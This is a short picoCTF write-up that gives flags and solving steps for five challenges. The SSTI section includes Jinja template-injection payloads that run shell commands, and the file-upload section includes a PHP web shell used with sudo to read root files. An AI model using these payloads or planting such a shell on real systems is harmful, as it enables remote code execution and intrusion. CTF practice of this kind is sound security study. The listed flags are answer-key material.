# picoCTF

## Fantasy CTF: 
picoCTF{m1113n1um_3d1710n_76b680a5}  </br>
Nc in using the given command <code>nc verbal-sleep.picoctf.net 63159</code>. Pressed enter when prompted and answered the questions correctly. Flag was given at the end when all questions were answered

## Cookie monster secret recipe: 
picoCTF{c00k1e_m0nster_l0ves_c00kies_98D0603F} </br>
Went to the website, and tried to log in using random log ins and passwords. The next page said to check the cookies, so I used inspect element and went to storage to find the cookies. There was a value called secret_recipe cGljb0NURntjMDBrMWVfbTBuc3Rlcl9sMHZlc19jMDBraWVzXzk4RDA2MDNGfQ%3D%3D. It was encoded in base64. Decoding gave the flag.

## head-dump:
picoCTF{Pat!3nt_15_Th3_K3y_ad7ea5ae} </br>
Went to the website, and only one hastag led to another part of the website, which was the api documentation. It led to Swagger, which had an endpoint called head dump. Executing it generated a file, and searching through it had the flag. 

## SSTI1
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_eb0c6390} </br>
Solve using server side template injection. First, locate the flag by submitting `{{config.__class__.__init__.__globals__['os'].popen('ls').read() }}` to the input field. There, you will find a file named flag. This file can be read by inputting `{{config.__class__.__init__.__globals__['os'].popen('cat flag').read() }}`. Within this file is the flag to the CTF.

## n0s4n1ty 1
picoCTF{wh47_c4n_u_d0_wPHP_8ca28f94} </br>
Files uploaded to the website are not sanitized; solve using file injection. First, upload `shell.php` (shell.php content found in codeblock below). After the file is uploaded, we can execute commands using the website link and a cmd parameter. `http://standard-pizzas.picoctf.net:52699/uploads/shell.php?cmd=sudo%20ls%20/root` will show that there is a `flag.txt` file in the /root directory. The content of the file, the flag, can be read using `http://standard-pizzas.picoctf.net:52699/uploads/shell.php?cmd=sudo%20cat%20/root/flag.txt`. 
```php shell.php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```
